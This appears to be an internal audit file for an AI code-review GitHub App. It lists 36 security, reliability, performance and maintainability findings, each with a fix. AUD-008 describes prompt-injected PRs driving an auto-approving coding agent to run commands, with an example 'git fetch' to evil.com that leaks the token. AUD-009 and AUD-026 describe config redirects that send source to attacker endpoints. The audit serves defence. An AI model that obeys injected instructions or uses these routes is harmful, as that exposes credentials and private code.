# Audit Issues — OpenCode AI Reviewer

> **Status:** Open · Last updated: 2026-08-13
> **Scope:** Full monorepo audit (lib, app, action, cli) + infra (Docker, CI/CD, EventBus, learning store).
> **Method:** Five parallel read-only audits — performance, error handling/resilience, security, code quality/maintainability, ops/infra. All findings verified against source.

---

## How to use this file

Each issue has a stable ID (`AUD-###`) so it can be referenced in commits, PRs, and issue trackers. Use the checkbox `[ ]` → `[x]` to mark work done. Track progress with `pnpm lint`, `pnpm typecheck`, `pnpm test`, and `pnpm build` before closing each item.

**Severity legend**

| Severity | Meaning |
|---|---|
| 🔴 Critical | Data loss, security hole, or permanent downtime on realistic workloads |
| 🟠 High | Degraded behavior, crash risk, or meaningful perf regression under load |
| 🟡 Medium | Robustness/maintainability gap with bounded impact |
| ⚪ Low | Cleanup / hygiene |

---

## Summary

| Severity | Count |
|---|---|
| 🔴 Critical | 4 |
| 🟠 High | 6 |
| 🟡 Medium | 14 |
| ⚪ Low | 12 |
| **Total** | **36** |

**Quick-win cluster (small diffs, high blast-radius):** AUD-001, AUD-002, AUD-003, AUD-005.

---

## 🔴 Critical

### AUD-001 — SQLite transactions are not serialized → data loss under concurrent webhooks

- **Location:** `lib/src/learning/db/sqlite.ts:100-110`
- **Category:** Reliability / Data integrity
- **Problem:** `transaction()` issues raw `BEGIN TRANSACTION` / `COMMIT` / `ROLLBACK` around `await fn()` with **no serialization**. Postgres/MySQL adapters route their async transaction bodies through the `serializeTransaction` mutex (`lib/src/learning/db/sql-adapter.ts:133-143`) precisely because the second BEGIN throws. The comment at `sql-adapter.ts:126-128` wrongly assumes better-sqlite3 is "unaffected" because it is synchronous — but the transaction **body is async** and yields at every `await`, so two concurrent webhooks (EventBus concurrency = 10, `bus.ts:6`) can interleave BEGIN/COMMIT → `cannot start a transaction within a transaction`, and the losing write is silently dropped.
- **Affected call sites (all in `sql-adapter.ts`):** `recordFindings` (:194), `deleteFindings` (:224), `getFalsePositiveRules` (:445), `generateSuppressionRules` (:515), `incrementAndCheckMetaReviewInterval` (:697), `recordPattern` (:714), `saveConversationExchange` (:1441), `cleanupConversations` (:1482).
- **Fix:** Wrap the body exactly like the other adapters:
  ```ts
  return this.serializeTransaction(async () => {
    this.db.exec('BEGIN TRANSACTION');
    try {
      const res = await fn();
      this.db.exec('COMMIT');
      return res;
    } catch (e) {
      this.db.exec('ROLLBACK');
      throw e;
    }
  });
  ```
  **Alternative:** use better-sqlite3's native synchronous `db.transaction(fn)` which serializes correctly.
- **Impact if unfixed:** intermittent dropped suppression-hit counters, skipped meta-review intervals, lost findings under concurrent webhooks.
- **Status:** [ ] Open

### AUD-002 — GitHub token embedded in git clone URL (argv + persisted in `.git/config`)

- **Location:** `app/src/handlers/commands.ts:91` (clone), `commands.ts:1054`, `autofix.ts:392,538` (pushes)
- **Category:** Security
- **Problem:** `git clone https://x-access-token:${token}@github.com/${repo}.git` (a) exposes the token in the process argv (visible via `ps` to any local user), and (b) persists it in `tempDir/.git/config` under `remote.origin.url`, re-sent on every `git push`.
- **Fix:** Clone without credentials in the URL and reuse the existing `GIT_ASKPASS` mechanism (`configureGit` → `lib/src/opencode.ts:1629-1654`):
  ```
  git clone --depth 1 https://github.com/${repo}.git
  env: { GIT_ASKPASS: <tempScript>, OPENCODE_CREDENTIAL_TOKEN: token }
  ```
  The existing `sanitizeString` redaction (`lib/src/utils/sanitize.ts:26`) already covers accidental `x-access-token:` leaks in errors.
- **Impact if unfixed:** token leakage to local processes and on-disk.
- **Status:** [ ] Open

### AUD-003 — No restart policy → crash or EC2 reboot leaves the app down indefinitely

- **Location:** `docker/docker-compose.yml:62-64`
- **Category:** Availability / Ops
- **Problem:** No `restart:` policy because `validate-env.sh` fail-fasts on bad config. Any process crash, OOM, or AWS maintenance reboot leaves the container `exited` forever; the only recovery is a manual `git push` or SSH. For a 24/7 GitHub App this is a standing availability hole.
- **Fix:** Add `restart: unless-stopped` **plus** keep fail-fast behavior: make `validate-env.sh` exit 0 after writing a fatal marker, or gate on a `VALIDATE_ONLY` env, or split the entrypoint (`restart: on-failure` + healthcheck-gated start). At minimum: `restart: unless-stopped` and make bad-config detection a healthcheck failure rather than a crash loop.
- **Impact if unfixed:** silent outage until manual intervention.
- **Status:** [ ] Open

### AUD-004 — EventBus is in-memory only; in-flight reviews/webhooks lost on crash with no GitHub retry

- **Location:** `lib/src/event-bus/bus.ts:25-27` (subscribers map + `history` capped at 100, memory only); `lib/src/event-bus/router.ts:74-79` (publish errors swallowed); `app/src/index.ts:82-96` (`app.onAny` catches everything → Probot returns 200)
- **Category:** Reliability / Data durability
- **Problem:** There is no durable queue. Because errors are swallowed, GitHub receives a 200 and treats delivery as successful — it will **never redeliver**. A crash mid-publish or mid-review permanently loses that review.
- **Fix (pick one):**
  1. **Durable:** persist webhook events to SQLite (`pending_events` table) before processing; ack/delete on completion; startup sweep re-queues un-acked events.
  2. **Retry-based:** stop swallowing errors — let the webhook handler return non-2xx on failure so GitHub redelivers, **and** ensure the container restarts (AUD-003).
- **Impact if unfixed:** lost reviews with no retry path.
- **Status:** [ ] Open

---

## 🟠 High

### AUD-005 — `spawnSync` linter execution blocks the whole Node process on the review hot path

- **Location:** `lib/src/engine.ts:4332` (`cp.spawnSync` in `runLinters`, called from `engine.ts:1032` on every review); `app/src/handlers/autofix.ts:144-158` (sync `pnpm install` / `npm ci` / `pnpm build` with `timeout: 600_000`)
- **Category:** Performance
- **Problem:** Linters (and dependency installs) run synchronously on the single-threaded Probot app. While ESLint/tsc runs (many seconds on large PRs), every other webhook, health probe, and SQLite query (better-sqlite3 is also sync) freezes. Multiple linter configs multiply the stall.
- **Fix:** Use `child_process.execFile`/`spawn` (async) — the app already has `execGit` (`app/src/utils/git.ts:35`) as the correct pattern. Keep `maxBuffer` (50MB) / `timeout` bounds on the async API. For installs, spawn async and await completion; if blocking is unavoidable, run in a worker thread or separate child process.
- **Impact if unfixed:** seconds-to-minutes app-wide stalls; dropped webhook responses.
- **Status:** [ ] Open

### AUD-006 — MCP tool listing/calls have no per-attempt timeout → hung MCP server stalls reviews forever

- **Location:** `lib/src/mcp/client.ts:237` (`withRetry(() => rc.listTools())`), `:277`, `:286-293`, `:336`, `:345-352`
- **Category:** Resilience
- **Problem:** `connectServer` bounds the *connect* with `Promise.race` timeout (:206-224), but `listTools`/`callTool` use only `withRetry`, which has **no timeout**. A server that connects then hangs never resolves/rejects, so backoff never starts — the call hangs forever, before `runOpenCode` runs (so the engine's 20-min timeout never bounds it). This violates the "MCP must degrade gracefully" mandate (hangs do not degrade).
- **Fix:** Wrap `listTools`/`callTool` in `withRetryAndTimeout(fn, timeoutMs, …)` (or race each call against an AbortController as `connectServer` does), with a conservative per-call timeout.
- **Impact if unfixed:** a single hung MCP server blocks that review indefinitely, holding a tempdir + subscriber slot.
- **Status:** [ ] Open

### AUD-007 — Unauthorized slash commands: any commenter can push branches + open PRs

- **Location:** `app/src/subscribers/fix.ts:29-66` (no actor check); `app/src/handlers/commands.ts:188-248, 1050-1079`; also `/docs`, `/changelog`, `/setup`, `/audit`, `/analyze`
- **Category:** Security
- **Problem:** `/fix` pushes `autofix/issue-N` to the repo's origin and opens a PR with the app's write-scoped token, and `/changelog` pushes `changelog/…` branches — for **any GitHub user who can comment**. The codebase already gates `/dismiss` on `author_association` (`app/src/handlers/dismiss.ts:19-78`) and `/rate-limits-reset` on an admin list (`app/src/subscribers/admin.ts:41-43`); apply the same pattern. Rate limiting bounds volume but not privilege.
- **Fix:** Require `author_association ∈ {OWNER, MEMBER, COLLABORATOR}` (or PR author) before executing `/fix`, `/docs`, `/changelog`, `/setup`; add an opt-in repo allowlist. At minimum gate the branch-push/PR-creation commands.
- **Impact if unfixed:** any commenter can trigger writes with the app token.
- **Status:** [ ] Open

### AUD-008 — Auto-approve AI agent runs on attacker-controlled fork code with all provider keys in env

- **Location:** `lib/src/opencode.ts:1290-1295` (`--auto` auto-approves every tool), `:1362-1367` (`safeEnv` injects `GITHUB_TOKEN`, `GH_TOKEN`, all `*_API_KEY`s), `:1388-1396` (spawn); fed by `app/src/handlers/autofix.ts:328` (`engine.runFix` on the fork's checked-out code)
- **Category:** Security
- **Problem:** The OpenCode CLI is a general-purpose coding agent with shell access. `--auto` approves **any** tool it requests. A prompt-injected PR (instructions embedded in code/comments/issue body) can have the agent execute arbitrary commands in the container with `GITHUB_TOKEN`/provider keys in env — including `git fetch https://evil.com/…`, where the token is handed to the attacker via `GIT_ASKPASS` (not host-scoped, `opencode.ts:1638-1642`). This is the product's core design (an AI fixes code for you), but the blast radius is unbounded.
- **Fix:** Run the fix/review agent in a **network-isolated sandbox/container**; do not place `GITHUB_TOKEN` in the agent's env (use a short-lived, repo-scoped installation token and allow egress only to `api.github.com`); scope askpass to `github.com` only; consider a read-only token for review and a separate, approval-gated token for push.
- **Impact if unfixed:** arbitrary code execution with the app's write token + provider keys.
- **Status:** [ ] Open

### AUD-009 — GitHub Action trusts PR-editable `.opencode-reviewer.yml` → LLM exfiltration

- **Location:** `action/src/index.ts:70` (`loadConfig(undefined,…)` reads `process.cwd()` = PR merge-commit checkout); `lib/src/config.ts:1038-1136` (validates `llm.providers[].baseUrl/apiKey`); `lib/src/engine.ts:299`; `lib/src/opencode.ts:815-846, 1368-1386` (writes attacker `baseUrl` + `apiKey` into CLI env)
- **Category:** Security
- **Problem:** In a fork-PR run, the author controls `.opencode-reviewer.yml`. They can set `llm.defaultProvider` + an `openai-compatible` provider whose `baseUrl` points at their server; the full review prompt (base repo source + anything secret-detection flagged) is then sent to the attacker's endpoint. The same file can set `secrets.allowlist`/`secrets.enabled` (`config.ts:1003-1014`) to disable secret detection on the base repo.
- **Fix:** Do not trust PR content for `llm`/`secrets` settings. Accept only the config from the base ref (fetch via API before checkout), restrict `llm.providers[].baseUrl` to an operator-supplied allowlist, and forbid PR-authored overrides of `llm`, `secrets`, `notifications`, `fix.checkAllowlist`.
- **Impact if unfixed:** reviewed source + detected secrets sent to attacker-controlled endpoints.
- **Status:** [ ] Open

### AUD-010 — Codebase index rebuilds fully on every autofix iteration; per-batch context recomputed per agent

- **Location:** `lib/src/engine.ts:461-470` (`codebaseIndexCacheKey` folds in `git status --porcelain`); `app/src/handlers/autofix.ts:204` (review per iteration); `engine.ts:1268, 1930` (`buildPRContextString` per agent); `lib/src/codebase-index/index.ts:77-153` (`getContextForFiles` loops all symbols/imports/edges)
- **Category:** Performance
- **Problem:** The cache key folds in `git status --porcelain`, so each autofix iteration (dirty worktree → commit+push) produces a fresh key and triggers a **full multi-minute index rebuild**. Separately, `getContextForFiles` runs once per agent per batch (4 agents default) — identical context recomputed 4×N times, each an O(index-size) scan.
- **Fix:** For autofix iterations, key the index on headSha only (index paths are stable; ignore tree dirt) or compute a delta index; hoist `buildPRContextString` + codebase context out of the per-agent loop and reuse across agents; pre-index symbols/edges by file path (Map) so filtering is O(changed files) instead of O(index).
- **Impact if unfixed:** minutes of wasted index rebuilds per autofix run; redundant LLM context work.
- **Status:** [ ] Open

---

## 🟡 Medium

### AUD-011 — `PRAGMA foreign_keys = ON` never executed — declared FK constraints unenforced

- **Location:** `lib/src/learning/db/sql-adapter.ts:1541-1543` (sets only `journal_mode = WAL`, `busy_timeout = 5000`); FK PRAGMA only in dead `lib/src/learning/db/migrations.ts:146` (migration v9)
- **Category:** Data integrity
- **Problem:** `feedback.finding_id → findings(id)` and `conversation_turns.session_id → conversation_sessions(id)` (declared in `lib/src/learning/schema.ts:56,262`) are not enforced. Orphaned rows accumulate (deleted findings leave feedback behind), silently corrupting learning-store analytics and FP-rate/suppression logic that joins on these keys.
- **Fix:** Execute `db.pragma('foreign_keys = ON')` at connect time next to WAL/busy_timeout (see also AUD-014 to delete the dead migrations file).
- **Status:** [ ] Open

### AUD-012 — Container stdout logs have no rotation → unbounded host disk growth

- **Location:** `docker/docker-compose.yml:34-56` (no `logging:` block)
- **Category:** Ops / Reliability
- **Problem:** Docker's default `json-file` driver writes all stdout to `/var/lib/docker/containers/*/*-json.log` with no size cap. Under constant webhook traffic with 10-concurrency subscribers, logs grow without bound on the small EBS volume (deploy script already fights ENOSPC, `deploy-ec2.yml:110-113`).
- **Fix:** Add:
  ```yaml
  logging:
    driver: json-file
    options: { max-size: "10m", max-file: "5" }
  ```
- **Status:** [ ] Open

### AUD-013 — No resource limits → the app can OOM the EC2 host

- **Location:** `docker/docker-compose.yml:34-56`
- **Category:** Ops / Reliability
- **Problem:** `pnpm install --prod` + better-sqlite3 native code + the opencode CLI model runs have no memory/CPU cap; a leak or huge review can OOM the instance.
- **Fix:** Set `mem_limit` (e.g. 1g), `cpus` (e.g. 1.0), and consider `pids_limit`/swap limits.
- **Status:** [ ] Open

### AUD-014 — ~2,000 lines of dead, duplicated code (optimized modules + migrations)

- **Location:**
  - `lib/src/codebase-index/extractor-optimized.ts` (1,141 lines) — zero importers; duplicate `CodebaseExtractor` class (also misleading "parallelism": `extractFileAsync` calls the sync `extractFile`; worker-thread scaffolding never spawned)
  - `lib/src/jsonl-parser-optimized.ts` (619 lines) — zero importers; duplicate of `jsonl-parser.ts`
  - `lib/src/learning/db/migrations.ts` (303 lines) — zero importers; superseded by `lib/src/learning/schema.ts:32` `applyMigrations(runner)` (which tests actually use)
- **Category:** Maintainability
- **Problem:** Unmaintained copies that drift from the live implementation and invite accidental cross-imports (duplicate class names); two competing migration systems with different semantics.
- **Fix:** Delete all three files (or move behind a single benchmark-selected implementation and delete the loser). Keep `schema.ts`'s `applyMigrations` as the single source of truth.
- **Status:** [ ] Open

### AUD-015 — `lib/src/engine.ts` is a 5,260-line god class (ReviewEngine)

- **Location:** `lib/src/engine.ts:163` (class spans to EOF)
- **Category:** Maintainability
- **Problem:** One class mixes 12+ cohesive sub-systems: PR review pipeline (~870 lines, `reviewPR` :692-1564), agent batch orchestration (~980 lines, :1565-2546), eight command runners (`runFix`/`runAudit`/`runAnalyze`/`runSelfHeal`/`runExplain`/`runDescribe`/`runDocs`/`runConversation`), secret/SCA/finding merging + sensitivity filtering (:3439-3775), linter integration (~550 lines, :4306-4525 + 4930-5260), cost/usage accounting (:4134-4247), token-budget math (:4567-4696), dedup/in-flight caching. Every change risks regressing unrelated commands; `lib/tests/engine.test.ts` (3,605 lines) must mirror the monolith.
- **Fix:** Split behind the existing `ReviewEngine` facade:
  - `lib/src/engine/review.ts` — `reviewPR` + dedup/in-flight helpers
  - `lib/src/engine/agents.ts` — agent category resolution, batch context, finding dedup
  - `lib/src/engine/commands.ts` — the eight `run*` command runners
  - `lib/src/engine/linters.ts` — `runLinters`/`parseLinterOutput`/`deduplicateAgainstLinters` (already bracketed by `// ---- Linter helpers ----` at :4930)
  - `lib/src/engine/cost.ts` — `estimateCost`, `attachUsage`, `computeTokenBudgetMetrics`, `computeEffectiveCap`
- **Status:** [ ] Open

### AUD-016 — Model resolution reimplemented 4× + config building 3×

- **Location:**
  - `lib/src/opencode.ts:1082` — `resolveModel(model, llm)` (provider-prefix logic)
  - `action/src/inputs.ts:319` — `resolveModel(value)` (comment at :301 admits it mirrors lib)
  - `app/src/utils/config.ts:80` — `resolveModel(fallback)` (`*-free` → `opencode-go` upgrade)
  - `lib/src/engine.ts:652` — `private resolveModel(stageField)` (stage-fallback)
  - Config builders: `app/src/utils/config.ts:buildConfig`, `action/src/inputs.ts:getInputs`, `cli/src/config.ts:buildAgentConfig` each re-layer `DEFAULT_CONFIG`; only the action uses lib's `mergeConfigWithInputs` (`lib/src/config.ts:330`, with `{}`)
- **Category:** Maintainability / Correctness risk
- **Problem:** Functionally identical provider-prefix logic kept in sync by hand; a divergence between wrappers and lib produces silently different model strings per deployment mode.
- **Fix:** Export a single `resolveModel(model, llm)` from `lib/src/utils/model-string.ts` and have `opencode.ts`, `action/src/inputs.ts`, `app/src/utils/config.ts` call it; delete the private copies. Share one config-layering helper in lib for all three wrappers.
- **Status:** [ ] Open

### AUD-017 — AbortSignal dropped at 3 layers → 600s subscriber timeout can't preempt long reviews

- **Location:** `lib/src/event-bus/bus.ts:132-183` (timeout sets `timedOut` + aborts signal, then `await work()` at :152 waits unconditionally); `app/src/subscribers/review.ts:96-126` (`handle` checks `signal.aborted` only at entry, never passes to `handlePRReview`); `lib/src/engine.ts:295-300` (`runLLM` never forwards signal to `runOpenCode`); `app/src/handlers/commands.ts:252-264` (passes `undefined` for audit signal); `commands.ts:127-167` (analyze/explain/describe don't receive `signal`)
- **Category:** Reliability
- **Problem:** `runOpenCode` *would* kill the child process group on abort (`opencode.ts:1443-1454`), but the signal is dropped at three layers. A slow review runs up to the OpenCode default of 20 minutes — 10 minutes past the bus timeout — while the bus still awaits it and the per-PR single-flight key stays held (subsequent events for the same PR queue behind a stale run). `/audit`, `/analyze`, `/explain`, `/describe` can never be cancelled.
- **Fix:** Thread the `AbortSignal` through `handlePRReview` → `engine.reviewPR` → `runLLM` → `runOpenCode` (and into the `runAudit`/`runAnalyze`/`runExplain`/`runDescribe` handlers), and/or `Promise.race` the subscriber work against the timeout so `publish()` never waits past it.
- **Status:** [ ] Open

### AUD-018 — Zero behavioral tests for `app/src/handlers/commands.ts` (and changelog/audit)

- **Location:** `app/src/handlers/commands.ts` (1,221 lines, highest-risk logic in the app); `app/src/handlers/changelog.ts` (349), `app/src/handlers/audit.ts` (214)
- **Category:** Test coverage
- **Problem:** No test file imports `handleCommand` directly. The four subscriber tests that reference it (`app/tests/subscribers/fix.test.ts:7-11`, `setup`, `docs`, `describe`) all `vi.mock()` the module — they verify the subscriber calls it, not that it works. Contains the riskiest logic (git clone, dependency install, command dispatch).
- **Fix:** Add `app/tests/handlers/commands.test.ts` with real (non-mocked) `handleCommand` tests; add coverage for `changelog.ts` and `audit.ts` (only `reply.ts` is covered today via `subscribers/reply.test.ts`).
- **Status:** [ ] Open

### AUD-019 — Git transport operations (fetch/push) in app handlers are not retried

- **Location:** `app/src/handlers/commands.ts:515-527, 860-872` (fetches), `:629, :1054` (pushes); same in `app/src/handlers/autofix.ts`
- **Category:** Resilience
- **Problem:** Every GitHub API call is wrapped in `withRetry` + `CircuitBreaker`, but the equally-external git transport is not. Fetches degrade gracefully, but `git push` (completes a `/fix`, `/docs`, or autofix run) has no retry — a single transient network drop aborts the run. `execGit` is timeout-bounded (`git.ts:39`, 120s), so not a hang, but a robustness gap.
- **Fix:** Wrap fetch/push `execGit` calls in `withRetry` (small `maxRetries`, `retryUnknownStatus: true`); safe for fetches and for `--force-with-lease` pushes (the lease protects the expected SHA).
- **Status:** [ ] Open

### AUD-020 — `cleanupConversations` performs two DELETEs without a transaction

- **Location:** `lib/src/learning/db/sql-adapter.ts:1482-1492`
- **Category:** Data integrity
- **Problem:** The `conversation_turns` DELETE and `conversation_sessions` DELETE are separate statements with no wrapping transaction. If the second fails, turns are deleted for sessions that still exist (orphaned rows) — the exact read-then-write atomicity the project mandates, and every other multi-statement write in this adapter is transactional.
- **Fix:** Wrap both DELETEs in `this.transaction(...)`, or rewrite as a single `DELETE` using a subquery.
- **Status:** [ ] Open

### AUD-021 — CI never builds the Docker image; Node versions drift from prod

- **Location:** `.github/workflows/ci.yml:19` (matrix `[22, 24]` → latest patch) vs `docker/Dockerfile:13,60` (`node:22.11.0` pinned); CI builds lib + action only (`ci.yml:56,71`), no `docker build`
- **Category:** CI / Reliability
- **Problem:** (a) Native `better-sqlite3` compilation under Debian-slim runtime is untested by CI — a broken prod install only surfaces at deploy time. (b) CI `node-version: 22` resolves to the newest 22.x while prod pins 22.11.0; a Node regression ships to prod unseen.
- **Fix:** Add a CI job that runs `docker build` (against `docker/Dockerfile`) to verify the image builds and `opencode --version` checks out; pin CI node to the same `22.11.0` in the matrix.
- **Status:** [ ] Open

### AUD-022 — Deploy has no rollback; health check only verifies "any container running"

- **Location:** `.github/workflows/deploy-ec2.yml:116-124`
- **Category:** Ops / Deploy safety
- **Problem:** `docker compose up -d --build` recreates the container; if the new one exits (bad `.env`, missing key, crash) the old container is already gone. The check (`sleep 10` + `docker compose ps --status running -q | grep -q .`) only verifies *some* container is running, never the new one's `/health` endpoint (`app/src/health.ts:102-105`). With no restart policy (AUD-003), a failed deploy = outage with no rollback.
- **Fix:** Check the health endpoint (`curl -fsS localhost:3000/health`) before declaring success; on failure, roll back to the previous image. Consider a rolling strategy that keeps the old container running until the new one is healthy.
- **Status:** [ ] Open

### AUD-023 — Every deploy is a cold build (`docker builder prune -af` before build)

- **Location:** `.github/workflows/deploy-ec2.yml:112`
- **Category:** Ops / Performance
- **Problem:** Wiping the builder cache before `--build` discards the `pnpm install` layer cache, so every deploy re-runs the full dependency install + better-sqlite3 native compile — slower deploys, a larger ENOSPC window, and any network flake during install fails the deploy.
- **Fix:** Prune with age filters (`docker builder prune --filter until=48h`) instead of `-af`; optionally add `pnpm install` retry in the Dockerfile.
- **Status:** [ ] Open

### AUD-024 — Scheduled workflows use non-frozen installs

- **Location:** `.github/workflows/hourly-orchestrator.yml:59`, `.github/workflows/self-improvement.yml:54` — `pnpm install` (not `--frozen-lockfile`)
- **Category:** CI / Reproducibility
- **Problem:** Autonomous jobs can silently drift to newer transitive deps than CI's locked tree, causing intermittent failures or non-reproducible behavior.
- **Fix:** Use `pnpm install --frozen-lockfile` to match `ci.yml:35`.
- **Status:** [ ] Open

### AUD-025 — Learning store persists raw review findings and conversation bodies unredacted

- **Location:** `lib/src/learning/db/sqlite.ts` + schema (`findings.message`/`suggestion`, `conversation_turns.body`, `lib/src/learning/schema.ts`); `lib/src/learning/store.ts`
- **Category:** Security / Privacy
- **Problem:** The store writes LLM findings (which can quote private source code, incl. secrets the model saw) and full user/assistant conversation messages with no sanitization, no encryption at rest, and no expiry for findings. Local SQLite is gitignored, but `DATABASE_URL` can point at shared Postgres/MySQL where the data is plainly readable.
- **Fix:** Run persisted messages/findings through `sanitizeString` before insert; document/encrypt the DB at rest; add a retention policy for `findings`/`conversation_turns`.
- **Status:** [ ] Open

### AUD-026 — App: repo-branch config can redirect LLM traffic (base-repo-controlled)

- **Location:** `app/src/utils/config.ts:328-433` (`mergeRepoConfig` merges `llm`, `secrets`, `notifications`, `sca` from the repo's `.opencode-reviewer.yml`); `lib/src/engine.ts:299`
- **Category:** Security
- **Problem:** The App clones the default branch and merges its `.opencode-reviewer.yml` into the effective config, so the same `llm.providers[].baseUrl` redirect (see AUD-009) works whenever the app is installed on a repo whose default branch an attacker can control (e.g. org-wide install with attacker-created repos). `notifications.slack/teams.webhookUrl` is also merged and can redirect review summaries.
- **Fix:** Treat the repo config as untrusted: only merge allowlisted review-tuning fields; require operator approval (env/global config) for `llm`/`secrets`/`notifications` in App mode.
- **Status:** [ ] Open

### AUD-027 — `validate-env.sh` contradicts the compose docs — "Basic" (token-only) mode is impossible

- **Location:** `docker/validate-env.sh:17-42` (hard-requires `APP_ID`, private key, `WEBHOOK_SECRET`, `GITHUB_TOKEN`) vs `docker/docker-compose.yml:6-8` (documents Basic mode as supported)
- **Category:** Config UX
- **Problem:** Anyone following the compose header and setting only `GITHUB_TOKEN` gets a container that exits 1 immediately, with no visible signal other than a dead container (no restart policy, AUD-003).
- **Fix:** Either enforce App mode in the docs only (delete the "Basic mode" claim), or make the script support token-only mode (skip APP_ID checks when only `GITHUB_TOKEN` + `NO_APP` is set).
- **Status:** [ ] Open

### AUD-028 — No healthcheck wired into compose despite `/health` existing

- **Location:** `docker/docker-compose.yml` service block; endpoints at `app/src/health.ts:102-110`
- **Category:** Ops
- **Problem:** `/health` (503 when DB unreachable) and `/ready` exist but are unused by the orchestrator and deploy check. Nothing restarts or alerts on a degraded-but-running container.
- **Fix:** Add `healthcheck: test: ["CMD", "curl", "-fsS", "http://localhost:3000/health"]` (install curl in the runtime image — currently only in the builder, `Dockerfile:16`) and consume it in deploy-ec2.
- **Status:** [ ] Open

---

## ⚪ Low

### AUD-029 — `.env.example` drifts significantly from what the code reads

- **Location:** `.env.example` (33 keys) vs code (~60 more `process.env.*` read but undocumented)
- **Problem:** Real options absent include `AUDIT_MODEL`, `SYNTHESIS_MODEL`, `VERIFICATION_MODEL`, `META_REVIEW_MODEL`, `EXPLANATION_MODEL`, `CONVERSATION_MODEL`, `ANALYSIS_MODEL`, `DOCS_MODEL`, `DESCRIBE_MODEL`, `MAX_LINES_PER_FILE`, `DOCS_ENABLED`, `DOCS_STYLE`, `DESCRIBE_ENABLED`, `REVIEW_INLINE`, `TOKEN_BUDGET`, `REVIEW_BUDGET*`, `ENABLE_REACHABILITY`, `ENABLE_META_VERIFICATION`, `REVIEW_TEST_GAP_DETECTION`, `ENABLE_CODEBASE_INDEX`, `CONVERSATION_*`, `OLLAMA_BASE_URL`, `LLM_MODEL`/`LLM_BASE_URL`/`LLM_API_KEY`, `DATABASE_URL`, `APP_PRIVATE_KEY`.
- **Fix:** Reconcile `.env.example` against the union of keys read in `app/src/utils/config.ts:buildConfig` (:130-230) and the other wrappers.
- **Status:** [ ] Open

### AUD-030 — `sanitize.ts` redaction misses several credential shapes

- **Location:** `lib/src/utils/sanitize.ts:19-30`
- **Problem:** The env-assignment regex only covers `OPENAI_API_KEY|ANTHROPIC_API_KEY|GEMINI_API_KEY|GITHUB_TOKEN` — not `OPENCODE_API_KEY`, `AZURE_OPENAI_API_KEY`, `AWS_SECRET_ACCESS_KEY`, generic JWTs, or the app private key. Any of these appearing in a logged string would be emitted verbatim.
- **Fix:** Extend the key-name pattern to all credential env vars the product reads (see `app/src/index.ts:29-37`); treat values under credential-shaped keys in structured logs as fully redacted (as the NDJSON path already does via `SECRET_KEY_PATTERN`, `lib/src/utils/logger.ts:120, 404`).
- **Status:** [ ] Open

### AUD-031 — askpass temp directories accumulate until process exit

- **Location:** `lib/src/opencode.ts:123-137, 1632-1633, 1730-1731`
- **Problem:** `configureGit` pushes each `opencode-askpass-*` temp dir into the module-level `askPassDirs` array, only cleaned on process `exit`/`SIGINT`/`SIGTERM`. In the long-running Probot App each `/fix`/`/docs` run leaks a 0700 temp dir until shutdown. The script itself contains no token (reads `$OPENCODE_CREDENTIAL_TOKEN` at prompt time), so this is low-risk disk litter, not a secret leak.
- **Fix:** Clean up the dir (`rmSync`) after the git session instead of only at process exit.
- **Status:** [ ] Open

### AUD-032 — `getFileContent` allows `..` segments in API path

- **Location:** `lib/src/utils/github.ts:640-650`
- **Problem:** `filePath.split('/').map(encodeURIComponent)` preserves `..` segments; a path like `../../../../etc/passwd` normalizes to `https://api.github.com/etc/passwd`. Not exploitable today (only sources are GitHub changed-file names / diff hunks, which cannot contain `..`), but a latent guard gap.
- **Fix:** Reject segments equal to `..` (and a leading `/`) before splitting.
- **Status:** [ ] Open

### AUD-033 — Ad-hoc error-message formatting repeated ~280× with no shared helper

- **Location:** pattern `err instanceof Error ? err.message : String(err)` across `lib/src`, `app/src`, `action/src`, `cli/src`; no `errorMessage`/`toErrorMessage`/`formatError` helper exists; error strings also shaped inconsistently (`GitHub API ${status}` vs `Webhook responded with` vs plain `message`)
- **Fix:** Add `errorMessage(err: unknown): string` to `lib/src/utils/logger.ts` (or a new `errors.ts`) and use it everywhere; normalize the "HTTP <status> on <path>" construction already repeated in `github.ts:146`, `gitlab-adapter.ts`, `notifier.ts`, `opencode.ts` into one `httpError(status, detail, {headers})` factory.
- **Status:** [ ] Open

### AUD-034 — `lib/src/types/index.ts` (2,120 lines) mixes 5 unrelated type domains

- **Location:** `lib/src/types/index.ts`
- **Problem:** One barrel mixes core review types (:11-204), config types + all `DEFAULT_*` constants (:207-1783), event-bus payloads (:1783-1929), GitHub subscriber types (:1929-1984), and learning types (:1984-2120). Any config change touches the file that defines `ReviewIssue`, `PipelineEventPayload`, and `LearningPattern`.
- **Fix:** Split into `types/review.ts`, `types/config.ts`, `types/events.ts`, `types/learning.ts`, keeping `types/index.ts` as a pure re-export facade (the pattern `lib/src/types/schemas.ts` already follows).
- **Status:** [ ] Open

### AUD-035 — Six near-duplicate tsconfig.json files

- **Location:** root, `lib/`, `lib/tsconfig.benchmark.json`, `app/`, `action/`, `cli/`
- **Problem:** Repeated compiler options with small divergences (`action` sets `moduleResolution: node`; `app`/`cli` don't; only `lib` has `declarationMap`+`sourceMap`). Root tsconfig references `lib/action/app` but not `cli`.
- **Fix:** Introduce a shared `tsconfig.base.json` extended by each package; add `cli` to root references.
- **Status:** [ ] Open

### AUD-036 — Misc hygiene

- **`cli/package.json:3`** — version drift: `1.6.29` vs `1.11.5` everywhere else. Align or use a single workspace root version.
- **`cli/dist/`** — stale gitignored build output on disk (built Aug 10 vs `cli/src/local-adapter.ts` modified Aug 13); running the CLI binary without rebuilding runs stale code. Add a `prebuild` cleanup or document the build command.
- **`action/lib/`** — 15 MB of compiled ncc output committed (expected for Actions), but can silently diverge from source if a release forgets to rebuild. Add a CI "bundle freshness" check in the release workflow.
- **`.github/workflows/ci.yml:113-115`** — "Coverage thresholds" job is a no-op (only echoes). Configure real `vitest` thresholds or delete the step.
- **`.github/workflows/codeql.yml:12-22`** — no `timeout-minutes` and no `concurrency:` group (push + schedule can race on `security-events: write`). Add both.
- **`docker/validate-env.sh:28-32`** — only checks private-key existence, not validity; a malformed PEM fails later at first token exchange. Parse the PEM header (`openssl pkey -in ... -noout` or grep for `BEGIN RSA PRIVATE KEY`).
- **`docker/docker-compose.yml:55`** — `ports: "3000:3000"` binds 0.0.0.0. Bind `127.0.0.1:3000:3000` if a reverse proxy fronts it.
- **`docker/Dockerfile:76-80`** — runtime installs prod deps for unused `action` + `cli` packages. Copy only `lib/package.json` + `app/package.json` into the runtime stage.
- **`.github/workflows/deploy-ec2.yml:67`** — rsync `--delete` removes any untracked server file not excluded; today safe (`.env`, `*.pem`, DB excluded) but document/validate the exclude list on every deploy.
